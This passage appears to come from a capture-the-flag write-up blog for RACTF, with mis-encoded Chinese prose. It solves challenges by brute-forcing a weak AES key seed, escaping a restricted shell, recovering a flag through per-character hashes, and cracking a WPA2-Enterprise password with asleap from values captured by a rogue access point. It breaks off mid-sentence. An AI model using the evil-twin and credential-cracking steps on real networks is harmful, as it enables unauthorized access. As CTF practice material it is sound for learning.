class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rawFlag = <span class="string">&quot;[REDACTED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag <span class="keyword">string</span></span><br><span class="line"><span class="keyword">var</span> flagmu sync.Mutex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS5Padding</span><span class="params">(ciphertext []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>, after <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">padding := (blockSize - <span class="built_in">len</span>(ciphertext)%blockSize)</span><br><span class="line">padtext := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="keyword">byte</span>(padding)&#125;, padding)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encrypt</span><span class="params">(plaintext <span class="keyword">string</span>, bKey []<span class="keyword">byte</span>, bIV []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">bPlaintext := PKCS5Padding([]<span class="keyword">byte</span>(plaintext), blockSize, <span class="built_in">len</span>(plaintext))</span><br><span class="line">block, err := aes.NewCipher(bKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">ciphertext := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(bPlaintext))</span><br><span class="line">mode := cipher.NewCBCEncrypter(block, bIV)</span><br><span class="line">mode.CryptBlocks(ciphertext, bPlaintext)</span><br><span class="line"><span class="keyword">return</span> hex.EncodeToString(ciphertext)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changer</span><span class="params">()</span></span> &#123;</span><br><span class="line">ticker := time.NewTicker(time.Millisecond * <span class="number">672</span>).C</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">range</span> ticker &#123;</span><br><span class="line">rand.Seed(time.Now().UnixNano() &amp; ^<span class="number">0x7FFFFFFFFEFFF000</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; rand.Intn(<span class="number">32</span>); i++ &#123;</span><br><span class="line">rand.Seed(rand.Int63())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">var</span> iv []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">32</span>; i++ &#123;</span><br><span class="line">key = <span class="built_in">append</span>(key, <span class="keyword">byte</span>(rand.Intn(<span class="number">255</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; aes.BlockSize; i++ &#123;</span><br><span class="line">iv = <span class="built_in">append</span>(iv, <span class="keyword">byte</span>(rand.Intn(<span class="number">255</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flagmu.Lock()</span><br><span class="line">flag = encrypt(rawFlag, key, iv, aes.BlockSize)</span><br><span class="line">flagmu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">flagmu.Lock()</span><br><span class="line">fmt.Fprint(w, flag)</span><br><span class="line">flagmu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Challenge starting up&quot;</span>)</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> changer()</span><br><span class="line"></span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ˜¯å°† flag ä½¿ç”¨ AES åŠ å¯†åè¾“å‡ºï¼Œè®¿é—®é¶æœºå¯ä»¥å¾—åˆ°ä¸€ä¸ª flag çš„å¯†æ–‡ã€‚æ ¹æ®å…¶ç®—æ³•å¯çŸ¥ï¼Œç”±äº 0x7FFFFFFFFEFFF000 çš„å¤„ç†ä½¿å¾—æ­¤å¤„å¯ä»¥çˆ†ç ´å‡º flagã€‚å†™ä¸ªè„šæœ¬æ¥å®Œæˆçˆ†ç ´ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">aesFlag := <span class="string">&quot;ff322d526ea821a59e7da84a1da772fe6cf99e7e5b02a1fd3ac7776b1cfdb03c&quot;</span></span><br><span class="line"><span class="keyword">for</span> seed := <span class="number">1</span>; seed &lt;= <span class="number">2147483647</span>; seed++ &#123;</span><br><span class="line">rand.Seed(<span class="keyword">int64</span>(seed))</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; rand.Intn(<span class="number">32</span>); i++ &#123;</span><br><span class="line">rand.Seed(rand.Int63())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">var</span> iv []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">32</span>; i++ &#123;</span><br><span class="line">key = <span class="built_in">append</span>(key, <span class="keyword">byte</span>(rand.Intn(<span class="number">255</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; aes.BlockSize; i++ &#123;</span><br><span class="line">iv = <span class="built_in">append</span>(iv, <span class="keyword">byte</span>(rand.Intn(<span class="number">255</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">block, _ := aes.NewCipher(key)</span><br><span class="line">decodedFlag, _ := hex.DecodeString(aesFlag)</span><br><span class="line">mode := cipher.NewCBCDecrypter(block, iv)</span><br><span class="line">bFlag := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(decodedFlag))</span><br><span class="line">mode.CryptBlocks(bFlag, decodedFlag)</span><br><span class="line">flag := <span class="keyword">string</span>(bFlag)</span><br><span class="line"><span class="keyword">if</span> strings.Contains(flag, <span class="string">&quot;ractf&quot;</span>) &#123;</span><br><span class="line">flag := flag[:<span class="built_in">len</span>(flag) - <span class="number">1</span>]</span><br><span class="line">fmt.Printf(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;int3rEst1ng_M4sk_paTt3rn&#125;</span><br></pre></td></tr></table></figure><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Missing-Tools"><a href="#Missing-Tools" class="headerlink" title="Missing Tools"></a>Missing Tools</h3><blockquote><p>Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?</p></blockquote><p>ç»™å‡ºçš„æ˜¯ä¸€ä¸ªæœ‰è¯¸å¤šé™åˆ¶çš„ bashï¼Œä½¿ç”¨ echo * å¯ä»¥å‘ç°åœ¨å½“å‰çš„ç›®å½•ä¸‹æœ‰ flag.txtã€‚ä½œè€…å¿½ç•¥äº† source è¿™ä¸ªæŒ‡ä»¤ï¼Œå› æ­¤å¯¼è‡´äº†ä¸€ä¸ªéé¢„æœŸï¼Œç›´æ¥ source flag.txt å³å¯å¾—åˆ°å¦‚ä¸‹å›æ˜¾ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source: ractf&#123;std0ut_1s_0v3rr4ted_spl1t_sha&#125;: No such file or directory</span><br></pre></td></tr></table></figure><h4 id="Intended-Solution"><a href="#Intended-Solution" class="headerlink" title="Intended Solution"></a>Intended Solution</h4><p>è¿™é¢˜çš„é¢„æœŸè§£æ˜¯ä½¿ç”¨ split é…åˆ sha256sum æ¥å°† flag åˆ†å‰²æˆä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªæ–‡ä»¶ç„¶åå¾—å‡º hashï¼Œå†æ ¹æ®å­—æ¯è¡¨åšå‡ºä¸€ä¸ª mapï¼ŒåŒ¹é…ä¹‹åå¾—å‡º flagã€‚æ‰§è¡Œ split -b 1 flag.txt å’Œ sha256sum x* ä¹‹åå¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xaa</span><br><span class="line">ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb  xab</span><br><span class="line">2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6  xac</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xad</span><br><span class="line">252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111  xae</span><br><span class="line">021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96  xaf</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xag</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xah</span><br><span class="line">18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4  xai</span><br><span class="line">5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9  xaj</span><br><span class="line">0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6  xak</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xal</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xam</span><br><span class="line">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b  xan</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xao</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xap</span><br><span class="line">5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9  xaq</span><br><span class="line">4c94485e0c21ae6c41ce1dfe7b6bfaceea5ab68e40a2476f50208e526f506080  xar</span><br><span class="line">4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce  xas</span><br><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xat</span><br><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xau</span><br><span class="line">4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a  xav</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xaw</span><br><span class="line">3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea  xax</span><br><span class="line">18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4  xay</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xaz</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xba</span><br><span class="line">148de9c5a7a44d19e56cd9ae1a554bf67847afb0c58f6e12fa29ac7ddfca9940  xbb</span><br><span class="line">acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0  xbc</span><br><span class="line">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b  xbd</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xbe</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xbf</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xbg</span><br><span class="line">aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123  xbh</span><br><span class="line">ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb  xbi</span><br><span class="line">d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2  xbj</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://md5decrypt.net/">https://md5decrypt.net/</a></p></blockquote><p>ä½¿ç”¨åœ¨çº¿çš„è§£å¯†å·¥å…·å¤„ç†åå¯ä»¥å¾—åˆ°å¦‚ä¸‹åŒ…å« flag çš„å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r</span><br><span class="line">ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb : a</span><br><span class="line">2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6 : c</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111 : f</span><br><span class="line">021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96 : &#123;</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4 : d</span><br><span class="line">5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9 : 0</span><br><span class="line">0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6 : u</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _</span><br><span class="line">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b : 1</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _</span><br><span class="line">5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9 : 0</span><br><span class="line">4c94485e0c21ae6c41ce1dfe7b6bfaceea5ab68e40a2476f50208e526f506080 : v</span><br><span class="line">4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce : 3</span><br><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r</span><br><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r</span><br><span class="line">4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a : 4</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea : e</span><br><span class="line">18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4 : d</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s</span><br><span class="line">148de9c5a7a44d19e56cd9ae1a554bf67847afb0c58f6e12fa29ac7ddfca9940 : p</span><br><span class="line">acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0 : l</span><br><span class="line">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b : 1</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s</span><br><span class="line">aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123 : h</span><br><span class="line">ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb : a</span><br><span class="line">d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2 : &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;std0ut_1s_0v3rr4ted_spl1t_sha&#125;</span><br></pre></td></tr></table></figure><h3 id="Call-amp-Response"><a href="#Call-amp-Response" class="headerlink" title="Call&amp;Response"></a>Call&amp;Response</h3><blockquote><p>Agent,</p><p>Weâ€™re working a major case. Weâ€™ve been called in to covertly investigate a foreign govt agency, the GDGS, by a private organisation. Weâ€™ve finished performing initial reconnaissance of the target building and itâ€™s surrounding areas. We know they have a wireless network which they use to carry out live activities. Gaining access here would be substiantial. Problem is, theyâ€™ve somewhat competently secured it using WPA2 EAP-PEAP authentication which means gaining a packet capture of the handshake process is useless as the authentication exchange is carried out over a TLS 1.2 session. Nonetheless, we setup an access point with same ESSID as the target and managed to trick an employeeâ€™s device into attempting to connect to our AP. In the process, weâ€™ve obtained an username and certain auth values. Weâ€™re not entirely sure what we need to do with them.</p><p>Can you take a look and help us recover the password?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:    PrinceAli</span><br><span class="line">c:    c3:ae:5e:f9:dc:0e:22:fb</span><br><span class="line">r:    6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0</span><br></pre></td></tr></table></figure><p>Flag format is <code>ractf&#123;recovered_password&#125;</code>.</p></blockquote><p>æ ¹æ®ç»™å‡ºçš„ä¿¡æ¯å¯ä»¥æ‰¾å‡ºå¦‚ä¸‹å‚è€ƒæ–‡ç« ã€‚</p><blockquote><p><a href="https://solstice.sh/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/#:~:text=This%20data%20can%20be%20passed%20to%20asleap%20to%20obtain%20a%20valid%20set%20of%20RADIUS%20credentials">https://solstice.sh/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/#:~:text=This%20data%20can%20be%20passed%20to%20asleap%20to%20obtain%20a%20valid%20set%20of%20RADIUS%20credentials</a>.</p></blockquote><p>ä½¿ç”¨æ–‡ç« ä¸­ç»™å‡ºçš„æ ¼å¼å’Œé¢˜ç›®ä¿¡æ¯æ„é€ å‡ºå¦‚ä¸‹æŒ‡ä»¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$asleap</span> -C c3:ae:5e:f9:dc:0e:22:fb -R 6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0 -W 10-million-password-list-top-10000.txt</span><br></pre></td></tr></table></figure><p>è¿è¡ŒæŒ‡ä»¤å¯ä»¥å¾—å‡ºå¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asleap 2.2 - actively recover LEAP&#x2F;PPTP passwords. &lt;jwright@hasborg.com&gt;</span><br><span class="line">Using wordlist mode with &quot;10-million-password-list-top-10000.txt&quot;.</span><br><span class="line">        hash bytes:        8799</span><br><span class="line">        NT hash:           1cb292fbd610e825d02492ec8d8c8799</span><br><span class="line">        password:          rainbow6</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥å¾—å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;rainbow6&#125;</span><br></pre></td></tr></table></figure><h3 id="RSFPWS-Intercepted"><a href="#RSFPWS-Intercepted" class="headerlink" title="RSFPWS - Intercepted"></a>RSFPWS - Intercepted</h3><blockquote><p>This game iâ€™m playing is fun! Thereâ€™s this box that seemingly does nothing thoughâ€¦ It sends a â€œnetwork requestâ€ whatever that is. Can you have a look?</p><p>(When the game launches, enter the IP and port you get from above. This challenge uses the same files and instance as other RSFPWS challenges)</p></blockquote><p>æŒ‰ç…§é¢˜ç›®ä¿¡æ¯è¿›å…¥æ¸¸æˆä¹‹åå¯ä»¥å‘ç°å¦‚ä¸‹æ–¹å—ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629274049432813/159081701df3f928ef111172b64463edd0315e45.png"></p><p>ä½¿ç”¨ WireShark æ¥æŠ“å–æµé‡ï¼Œæ§åˆ¶æ¸¸æˆè§’è‰²èµ°å…¥æ–¹å—ä¸­ï¼Œå³å¯åœ¨ WireShark ä¸­çœ‹åˆ°ä¸€ä¸ª TCP æµé‡åŒ…ï¼Œå…¶ä¸­åŒ…å«å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;...........Welcome to the server!....................Lemon-...............Lemon.......@...................?...........*..............ractf&#123;N3tw0rking_L1ke_4_B0ss!&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…¶ä¸­åŒ…å«ç€ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;N3tw0rking_L1ke_4_B0ss!&#125;</span><br></pre></td></tr></table></figure><h3 id="RSFPWS-Invulnerable"><a href="#RSFPWS-Invulnerable" class="headerlink" title="RSFPWS - Invulnerable"></a>RSFPWS - Invulnerable</h3><blockquote><p>This game iâ€™m playing is fun! They have these cubes where you walk into them and take damage, how awesome! One of them instant kills you though, that kinda sucks. Can you solve that?</p><p>(When the game launches, enter the IP and port you get from above. This challenge uses the same files and instance as other RSFPWS challenges)</p></blockquote><p>è¿›å…¥æ¸¸æˆä¹‹åå‘ç°ä¸¤ä¸ªæ–¹å—ã€‚ä¸€ä¸ªæ˜¯æ¸¸æˆè§’è‰² HP-5 è€Œä¸€ä¸ªæ˜¯ç›´æ¥å°†æ¸¸æˆè§’è‰² HP å˜ä¸º 0ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629275544775010/4b1da8b0c7d07e8aa89c393a2739e1897946ff0a.png"></p><p>åªéœ€è¦ç”¨ Cheat Engine æ‰¾å‡ºå­˜å‚¨äº† HP 